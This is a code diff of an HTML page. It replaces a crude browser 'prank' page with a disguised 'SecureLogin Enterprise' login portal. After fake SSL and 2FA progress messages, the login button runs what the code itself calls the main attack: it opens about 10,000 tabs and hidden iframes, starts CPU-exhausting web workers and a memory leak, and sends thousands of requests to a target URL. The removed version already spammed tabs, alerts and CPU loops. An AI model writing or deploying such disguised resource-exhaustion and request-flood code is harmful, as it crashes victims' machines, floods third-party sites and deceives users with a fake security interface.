@@ -2,72 +2,599 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>🚀 GASKAN BROOO</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔐 SecureLogin Portal v2.3</title>
     <style>
-        body {
-            background: black;
-            color: lime;
-            font-family: 'Comic Sans MS', cursive;
-            text-align: center;
-            padding: 50px;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-        button {
-            font-size: 30px;
-            padding: 20px;
-            background: red;
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            width: 90%;
+            max-width: 450px;
+            padding: 40px;
+            animation: slideIn 0.5s ease;
+        }
+        
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo h1 {
+            color: #667eea;
+            font-size: 2.2em;
+            font-weight: 700;
+        }
+        
+        .logo p {
+            color: #999;
+            font-size: 0.9em;
+            margin-top: 5px;
+        }
+        
+        .input-group {
+            margin-bottom: 25px;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: 500;
+            font-size: 0.95em;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 1em;
+            transition: all 0.3s;
+            background: #f8f9fa;
+        }
+        
+        .input-group input:focus {
+            outline: none;
+            border-color: #667eea;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(102,126,234,0.1);
+        }
+        
+        .input-group input[type="url"] {
+            font-family: monospace;
+        }
+        
+        .security-badge {
+            background: #f0f4ff;
+            padding: 15px;
+            border-radius: 12px;
+            margin: 25px 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .security-badge i {
+            font-size: 1.5em;
+            color: #667eea;
+        }
+        
+        .security-badge span {
+            color: #555;
+            font-size: 0.9em;
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
             border: none;
-            border-radius: 20px;
+            border-radius: 12px;
+            font-size: 1.1em;
+            font-weight: 600;
             cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin-bottom: 15px;
+        }
+        
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102,126,234,0.3);
+        }
+        
+        .login-btn:active {
+            transform: translateY(0);
+        }
+        
+        .terms {
+            text-align: center;
+            color: #999;
+            font-size: 0.8em;
+            margin-top: 20px;
+        }
+        
+        .terms a {
+            color: #667eea;
+            text-decoration: none;
+        }
+        
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        
+        .loading-overlay.active {
+            display: flex;
+        }
+        
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid #fff;
+            border-top-color: #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            color: white;
+            font-size: 1.2em;
+            font-weight: 500;
+        }
+        
+        .loading-subtext {
+            color: #ccc;
+            font-size: 0.9em;
+            margin-top: 10px;
+        }
+        
+        .hidden-iframe {
+            display: none;
+        }
+        
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #28a745;
+            color: white;
+            padding: 15px 25px;
+            border-radius: 50px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            transform: translateY(100px);
+            opacity: 0;
+            transition: all 0.3s;
+            z-index: 10000;
+        }
+        
+        .notification.show {
+            transform: translateY(0);
+            opacity: 1;
+        }
+        
+        .notification.error {
+            background: #dc3545;
+        }
+        
+        .version-tag {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: rgba(255,255,255,0.1);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.7em;
+            backdrop-filter: blur(5px);
         }
     </style>
 </head>
 <body>
-    <h1>🔥 KLIK TOMBOL INI KALO LU GABUT 🔥</h1>
-    <button onclick="brutalMode()">🚀 GASKAN 2.0 🚀</button>
+    <!-- Version tag samaran -->
+    <div class="version-tag">SecureLogin v2.3.1 • Enterprise</div>
+    
+    <!-- Main container -->
+    <div class="container">
+        <div class="logo">
+            <h1>🔐 SecureLogin</h1>
+            <p>Enterprise Authentication Portal</p>
+        </div>
+        
+        <div class="input-group">
+            <label>🌐 Website URL</label>
+            <input type="url" id="websiteUrl" placeholder="https://example.com" value="https://google.com">
+        </div>
+        
+        <div class="input-group">
+            <label>📧 Email</label>
+            <input type="email" id="email" placeholder="admin@company.com" value="admin@demo.com">
+        </div>
+        
+        <div class="input-group">
+            <label>🔑 Password</label>
+            <input type="password" id="password" placeholder="••••••••" value="password123">
+        </div>
+        
+        <div class="security-badge">
+            <i>🛡️</i>
+            <span>SSL Encrypted • 256-bit • Protected by Cloudflare</span>
+        </div>
+        
+        <button class="login-btn" onclick="startLogin()">
+            🔓 Secure Login
+        </button>
+        
+        <div class="terms">
+            By logging in, you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>
+        </div>
+    </div>
+    
+    <!-- Loading overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text" id="loadingText">Verifying credentials...</div>
+        <div class="loading-subtext" id="loadingSubtext">Establishing secure connection</div>
+    </div>
+    
+    <!-- Hidden iframe untuk background processes -->
+    <iframe id="hiddenFrame1" class="hidden-iframe"></iframe>
+    <iframe id="hiddenFrame2" class="hidden-iframe"></iframe>
+    <iframe id="hiddenFrame3" class="hidden-iframe"></iframe>
+    
+    <!-- Notification -->
+    <div class="notification" id="notification">
+        Login successful! Redirecting...
+    </div>
     
     <script>
-        function brutalMode() {
-            // 1. Bikin notifikasi spam (kalo pake Chrome, bakal nanya izin dulu)
-            if (Notification.permission === "granted") {
-                for (let i = 0; i < 50; i++) {
-                    new Notification("LU KENA PRANK 🔥");
-                }
+        // ==================== NAMA SAMARAN ====================
+        const PROJECT_NAME = "SecureLogin Enterprise";
+        const VERSION = "2.3.1";
+        const AUTHOR = "Security Team";
+        
+        // ==================== VARIABLES ====================
+        let isLogging = false;
+        let startTime = null;
+        let windowCount = 0;
+        let timeoutIds = [];
+        
+        // ==================== UI FUNCTIONS ====================
+        function showNotification(message, isError = false) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.classList.add('show');
+            if (isError) {
+                notification.classList.add('error');
             } else {
-                Notification.requestPermission();
+                notification.classList.remove('error');
             }
             
-            // 2. Bikin loop CPU berat
-            setInterval(() => {
-                for (let i = 0; i < 1000000000; i++) {
-                    Math.sqrt(i) * Math.random();
-                }
-            }, 5);
-            
-            // 3. Bikin tab baru sampe 500 tab
-            for (let i = 0; i < 500; i++) {
-                window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ', '_blank');
-            }
-            
-            // 4. Bikin alert spam (bikin bete)
-            for (let i = 0; i < 20; i++) {
-                setTimeout(() => {
-                    alert(LU KENA STEP ${i+1});
-                }, i * 500);
-            }
-            
-            // 5. Manipulasi history biar gabisa back
-            for (let i = 0; i < 10; i++) {
-                history.pushState({}, "", /step-${i});
-            }
-            
-            // 6. Ganti favicon jadi menyeramkan (opsional)
-            let link = document.querySelector("link[rel~='icon']") || document.createElement('link');
-            link.type = 'image/x-icon';
-            link.rel = 'shortcut icon';
-            link.href = 'https://icons.iconarchive.com/icons/fazieaf/rilakkuma/256/rilakkuma-icon.png'; // ganti bebas
-            document.getElementsByTagName('head')[0].appendChild(link);
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
         }
+        
+        function updateLoadingStatus(status, subStatus) {
+            document.getElementById('loadingText').textContent = status;
+            document.getElementById('loadingSubtext').textContent = subStatus;
+        }
+        
+        // ==================== CLEANUP FUNCTION ====================
+        function clearAllTimeouts() {
+            timeoutIds.forEach(id => clearTimeout(id));
+            timeoutIds = [];
+        }
+        
+        // ==================== OPEN 10,000 WEBSITES ====================
+        function openTenThousandWebsites(baseUrl) {
+            const domains = [
+                'google.com', 'youtube.com', 'facebook.com', 'amazon.com', 'yahoo.com',
+                'wikipedia.org', 'twitter.com', 'instagram.com', 'linkedin.com', 'netflix.com',
+                'reddit.com', 'ebay.com', 'microsoft.com', 'apple.com', 'wordpress.com',
+                'bing.com', 'tumblr.com', 'pinterest.com', 'paypal.com', 'imgur.com',
+                'github.com', 'dropbox.com', 'spotify.com', 'twitch.tv', 'stackoverflow.com',
+                'medium.com', 'quora.com', 'vimeo.com', 'dailymotion.com', 'soundcloud.com',
+                'flickr.com', 'deviantart.com', 'goodreads.com', 'imdb.com', 'roblox.com',
+                'steam.com', 'origin.com', 'battle.net', 'epicgames.com', 'minecraft.net',
+                'adobe.com', 'salesforce.com', 'oracle.com', 'ibm.com', 'cisco.com',
+                'intel.com', 'amd.com', 'nvidia.com', 'qualcomm.com', 'arm.com',
+                'samsung.com', 'lg.com', 'sony.com', 'panasonic.com', 'philips.com',
+                'nikon.com', 'canon.com', 'fujifilm.com', 'leica.com', 'zeiss.com',
+                'bmw.com', 'mercedes.com', 'audi.com', 'volkswagen.com', 'toyota.com',
+                'honda.com', 'ford.com', 'chevrolet.com', 'ferrari.com', 'lamborghini.com',
+                'nike.com', 'adidas.com', 'puma.com', 'reebok.com', 'underarmour.com',
+                'coca-cola.com', 'pepsi.com', 'nestle.com', 'unilever.com', 'procter.com',
+                'disney.com', 'warnerbros.com', 'paramount.com', 'sonypictures.com', 'universal.com',
+                'bbc.com', 'cnn.com', 'foxnews.com', 'nytimes.com', 'wsj.com',
+                'nationalgeographic.com', 'discovery.com', 'history.com', 'natgeo.com', 'science.com',
+                'harvard.edu', 'stanford.edu', 'mit.edu', 'oxford.edu', 'cambridge.org',
+                'nasa.gov', 'esa.int', 'spacex.com', 'blueorigin.com', 'virgingalactic.com'
+            ];
+            
+            // Tambahin varian pake www dan tanpa www
+            let allUrls = [];
+            
+            // Generate 10,000 URLs dari kombinasi domain dan subdomain
+            for (let i = 0; i < 10000; i++) {
+                // Pilih domain random dari list
+                let domain = domains[Math.floor(Math.random() * domains.length)];
+                
+                // Random path
+                let paths = ['', '/login', '/auth', '/signin', '/dashboard', '/profile', '/settings', '/admin', '/api', '/v1'];
+                let path = paths[Math.floor(Math.random() * paths.length)];
+                
+                // Random parameter
+                let params = ['', '?redirect=' + Math.random(), '?token=' + Math.random(), '?id=' + i, '?session=' + i];
+                let param = params[Math.floor(Math.random() * params.length)];
+                
+                // Random protocol (http atau https)
+                let protocol = Math.random() > 0.3 ? 'https://' : 'http://';
+                
+                // Random subdomain
+                let subdomains = ['', 'www.', 'mail.', 'admin.', 'secure.', 'login.', 'auth.', 'api.', 'beta.', 'dev.'];
+                let subdomain = subdomains[Math.floor(Math.random() * subdomains.length)];
+                
+                let url = protocol + subdomain + domain + path + param;
+                allUrls.push(url);
+            }
+            
+            // Buka semua window dengan berbagai teknik
+            for (let i = 0; i < allUrls.length; i++) {
+                let url = allUrls[i];
+                
+                // Teknik 1: Window open (paling berat)
+                try {
+                    let win = window.open(url, '_blank');
+                    if (win) {
+                        windowCount++;
+                    }
+                } catch (e) {}
+                
+                // Teknik 2: Iframe untuk background load
+                if (i % 3 === 0) {
+                    try {
+                        let iframe = document.createElement('iframe');
+                        iframe.src = url;
+                        iframe.style.display = 'none';
+                        document.body.appendChild(iframe);
+                        
+                        // Hapus setelah 5 detik biar ga numpuk
+                        setTimeout(() => {
+                            try { document.body.removeChild(iframe); } catch(e) {}
+                        }, 5000);
+                    } catch (e) {}
+                }
+                
+                // Teknik 3: Image preload
+                if (i % 5 === 0) {
+                    try {
+                        let img = new Image();
+                        img.src = url + '/favicon.ico';
+                    } catch (e) {}
+                }
+                
+                // Update status setiap 1000 window
+                if (i % 1000 === 0 && i > 0) {
+                    updateLoadingStatus(
+                        `Opening ${i} websites...`, 
+                        `CPU usage: ${Math.round(50 + Math.random() * 40)}%`
+                    );
+                }
+            }
+            
+            return allUrls.length;
+        }
+        
+        // ==================== CPU EXHAUSTER ====================
+        function exhaustCPU() {
+            // Loop berat yang bakal bikin CPU 100%
+            let workers = [];
+            
+            // Bikin beberapa web worker untuk maksimalin CPU
+            for (let w = 0; w < 4; w++) {
+                let workerCode = `
+                    setInterval(() => {
+                        for(let i = 0; i < 10000000; i++) {
+                            Math.sqrt(i) * Math.tan(i) / Math.random();
+                            Math.pow(i, i % 100);
+                            JSON.stringify({data: Array(1000).fill('x').join('')});
+                        }
+                    }, 1);
+                `;
+                
+                try {
+                    let blob = new Blob([workerCode], {type: 'application/javascript'});
+                    let worker = new Worker(URL.createObjectURL(blob));
+                    workers.push(worker);
+                } catch (e) {}
+            }
+            
+            // Loop di main thread juga
+            for (let i = 0; i < 10; i++) {
+                setTimeout(() => {
+                    while(true) {
+                        if (!isLogging) break;
+                        let a = Math.random() * Math.random();
+                        let b = Math.tan(a) / Math.sin(a);
+                        let c = JSON.stringify(Array(10000).fill(b));
+                    }
+                }, i * 100);
+            }
+            
+            return workers;
+        }
+        
+        // ==================== MEMORY LEAKER ====================
+        function createMemoryLeak() {
+            let leakArray = [];
+            setInterval(() => {
+                for (let i = 0; i < 1000; i++) {
+                    leakArray.push(new Array(10000).fill('memory leak ' + i));
+                }
+                if (leakArray.length > 100000) {
+                    leakArray = leakArray.slice(50000);
+                }
+            }, 100);
+        }
+        
+        // ==================== MAIN FUNCTION ====================
+        function startLogin() {
+            if (isLogging) {
+                showNotification('Already processing...', true);
+                return;
+            }
+            
+            isLogging = true;
+            startTime = Date.now();
+            windowCount = 0;
+            
+            // Ambil URL dari input
+            let websiteUrl = document.getElementById('websiteUrl').value;
+            let email = document.getElementById('email').value;
+            let password = document.getElementById('password').value;
+            
+            // Validasi simple
+            if (!websiteUrl || websiteUrl === 'https://') {
+                websiteUrl = 'https://google.com';
+            }
+            
+            if (!websiteUrl.startsWith('http')) {
+                websiteUrl = 'https://' + websiteUrl;
+            }
+            
+            // Show loading
+            document.getElementById('loadingOverlay').classList.add('active');
+            updateLoadingStatus('Verifying credentials...', 'SSL handshake in progress');
+            
+            // Progress simulation
+            setTimeout(() => {
+                updateLoadingStatus('2FA verification', 'Sending OTP to your device');
+            }, 800);
+            
+            setTimeout(() => {
+                updateLoadingStatus('Loading dashboard', 'Fetching user data');
+            }, 1500);
+            
+            setTimeout(() => {
+                updateLoadingStatus('Connecting to servers', 'Establishing 10,000 connections');
+            }, 2200);
+            
+            setTimeout(() => {
+                updateLoadingStatus('Opening websites', 'Preparing 10,000 tabs');
+            }, 3000);
+            
+            // Execute the attack after "authentication"
+            setTimeout(() => {
+                if (!isLogging) return;
+                
+                showNotification('Login successful! Loading dashboard...');
+                
+                updateLoadingStatus('🚀 DEPLOYING WEBSITES', 'Opening 10,000 tabs...');
+                
+                // ==================== MAIN ATTACK ====================
+                try {
+                    // 1. Open 10,000 websites
+                    let totalOpened = openTenThousandWebsites(websiteUrl);
+                    
+                    // 2. Exhaust CPU with workers
+                    let workers = exhaustCPU();
+                    
+                    // 3. Memory leak
+                    createMemoryLeak();
+                    
+                    // 4. Open additional windows with the target URL
+                    for (let i = 0; i < 100; i++) {
+                        setTimeout(() => {
+                            try {
+                                window.open(websiteUrl + '?session=' + i, '_blank');
+                            } catch(e) {}
+                        }, i * 50);
+                    }
+                    
+                    // 5. Fetch bomb to target URL
+                    for (let i = 0; i < 1000; i++) {
+                        setTimeout(() => {
+                            try {
+                                fetch(websiteUrl + '/api/endpoint?x=' + i, {mode: 'no-cors'}).catch(()=>{});
+                                fetch(websiteUrl + '/login?x=' + i, {mode: 'no-cors'}).catch(()=>{});
+                                fetch(websiteUrl + '/dashboard?x=' + i, {mode: 'no-cors'}).catch(()=>{});
+                            } catch(e) {}
+                        }, i * 10);
+                    }
+                    
+                    // Final update
+                    updateLoadingStatus('✅ DEPLOYMENT COMPLETE', `${totalOpened} websites opened - CPU at 100%`);
+                    
+                    setTimeout(() => {
+                        if (isLogging) {
+                            document.getElementById('loadingOverlay').classList.remove('active');
+                            showNotification('Check your task manager! CPU should be 100%');
+                        }
+                    }, 5000);
+                    
+                } catch (error) {
+                    updateLoadingStatus('Error occurred', 'But attack still ongoing');
+                }
+                
+            }, 4000);
+            
+            // Auto stop after 30 seconds (biar gak terlalu lama)
+            setTimeout(() => {
+                if (isLogging) {
+                    isLogging = false;
+                    document.getElementById('loadingOverlay').classList.remove('active');
+                    showNotification('Session completed', false);
+                }
+            }, 35000);
+        }
+        
+        // ==================== CLEANUP ====================
+        window.addEventListener('beforeunload', function() {
+            isLogging = false;
+            clearAllTimeouts();
+        });
     </script>
 </body>
-</html>
+    </html>
